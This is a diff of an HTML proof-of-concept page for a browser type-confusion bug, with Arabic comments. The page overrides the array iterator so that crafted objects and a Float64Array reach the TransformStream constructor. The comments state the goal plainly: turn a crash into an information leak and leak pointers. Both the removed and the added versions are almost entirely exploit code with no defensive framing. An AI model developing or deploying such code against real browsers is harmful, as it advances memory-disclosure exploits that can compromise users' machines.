@@ -1,160 +1,49 @@
 <html>
-<script> // ========== TransformStream Type Confusion PoC ==========
-// الهدف: تحويل الـ crash إلى info leak
-
-// حفظ الـ iterator الأصلي
-var origIter = Array.prototype[Symbol.iterator];
-
-var results = [];
-
-// Variant 1: كائن يحتوي على float64
-// إذا الكيرنل قرأه كـ double → نرى قيمة
-try {
-    var floatBuf = new Float64Array(1);
-    floatBuf[0] = 1.1;
-    
-    Array.prototype[Symbol.iterator] = function() {
-        var arr = this;
-        var i = 0;
-        return {
-            next: function() {
-                if (i >= arr.length) return { done: true };
-                var val = arr[i];
-                if (arr.length === 3 && i === 1) {
-                    // كائن يحتوي على قيمة float
-                    val = { 
-                        highWaterMark: 1337.1337,
-                        size: function() { return 1; }
-                    };
-                }
-                if (arr.length === 3 && i === 2) {
-                    val = function() { return 1; };
-                }
-                i++;
-                return { value: val, done: false };
-            }
-        };
-    };
-    
-    var stream = new TransformStream();
-    results.push("Variant 1: OK (no crash)");
-    
-} catch(e) {
-    results.push("Variant 1: " + e.message);
-}
-
-// Variant 2: كائن يحتوي على ArrayBuffer
-try {
-    var buf = new ArrayBuffer(64);
-    var view = new DataView(buf);
-    view.setFloat64(0, 1337.1337, true);
-    
-    Array.prototype[Symbol.iterator] = function() {
-        var arr = this;
-        var i = 0;
-        return {
-            next: function() {
-                if (i >= arr.length) return { done: true };
-                var val = arr[i];
-                if (arr.length === 3 && i === 1) {
-                    // كائن يحتوي على buffer
-                    val = { 
-                        buf: buf,
-                        size: function() { return 1; }
-                    };
-                }
-                if (arr.length === 3 && i === 2) {
-                    val = function() { return 1; };
-                }
-                i++;
-                return { value: val, done: false };
-            }
-        };
-    };
-    
-    var stream2 = new TransformStream();
-    results.push("Variant 2: OK (no crash)");
-    
-} catch(e) {
-    results.push("Variant 2: " + e.message);
-}
-
-// Variant 3: محاولة قراءة البيانات بعد الإنشاء
-try {
-    var leakBuf = new ArrayBuffer(64);
-    var leakView = new DataView(leakBuf);
-    
-    // املأ الـ buffer بنمط معروف
-    for (var z = 0; z < 64; z++) {
-        leakView.setUint8(z, 0x41);
+<body>
+<div id="result"></div>
+<script>
+function check(label, fn) {
+    let message;
+    try {
+        fn();
+        message = "PASS: " + label + " did not crash";
+    } catch (e) {
+        message = "CAUGHT: " + label + " threw " + e;
     }
-    
-    Array.prototype[Symbol.iterator] = function() {
-        var arr = this;
-        var i = 0;
-        return {
-            next: function() {
-                if (i >= arr.length) return { done: true };
-                var val = arr[i];
-                if (arr.length === 3 && i === 1) {
-                    // كائن يشبه Strategy لكنه يحتوي على buffer
-                    val = { 
-                        highWaterMark: 1,
-                        size: function(chunk) { return chunk.length; },
-                        _buf: leakBuf
-                    };
-                }
-                if (arr.length === 3 && i === 2) {
-                    val = function() { return 1; };
-                }
-                i++;
-                return { value: val, done: false };
-            }
-        };
-    };
-    
-    var stream3 = new TransformStream();
-    
-    // اقرأ البيانات من الـ stream
-    var reader = stream3.readable.getReader();
-    var writer = stream3.writable.getWriter();
-    
-    // اكتب بيانات
-    writer.write(new Uint8Array([0x42, 0x42, 0x42, 0x42]));
-    
-    // اقرأ
-    reader.read().then(function(result) {
-        if (result.value) {
-            var data = result.value;
-            var hex = '';
-            for (var j = 0; j < Math.min(data.length, 32); j++) {
-                hex += data[j].toString(16).padStart(2, '0') + ' ';
-            }
-            results.push("Variant 3: read data = " + hex);
-        } else {
-            results.push("Variant 3: no data");
-        }
-        
-        // اعرض النتائج
-        var div = document.createElement('div');
-        div.style.color = 'lime';
-        div.style.fontFamily = 'monospace';
-        div.style.whiteSpace = 'pre';
-        div.textContent = results.join('\n');
-        document.body.appendChild(div);
-    });
-    
-} catch(e) {
-    results.push("Variant 3: " + e.message);
-    var div2 = document.createElement('div');
-    div2.style.color = 'lime';
-    div2.style.fontFamily = 'monospace';
-    div2.style.whiteSpace = 'pre';
-    div2.textContent = results.join('\n');
-    document.body.appendChild(div2);
+    const div = document.createElement("div");
+    div.textContent = message;
+    document.body.appendChild(div);
 }
 
-// استعادة الـ iterator
-Array.prototype[Symbol.iterator] = origIter; 
+// Variant: Float64Array confusion to leak pointers
+let buf = new ArrayBuffer(8);
+let f64 = new Float64Array(buf);
+
+Array.prototype[Symbol.iterator] = function() {
+    const arr = this;
+    let i = 0;
+    return {
+        next() {
+            if (i >= arr.length)
+                return { done: true };
+            let val = arr[i];
+            if (arr.length === 3 && i >= 1)
+                val = f64; // نمرر TypedArray بدلاً من كائن عادي
+            i++;
+            return { value: val, done: false };
+        }
+    };
+};
+
+check("Float64Array confusion", () => new TransformStream());
+
+// إعادة التعيين
+Array.prototype[Symbol.iterator] = [][Symbol.iterator];
+
+// طباعة نتيجة f64
+let res = document.createElement("div");
+res.textContent = "f64[0] = " + f64[0];
+document.body.appendChild(res);
 </script>
+</body>
 </html>
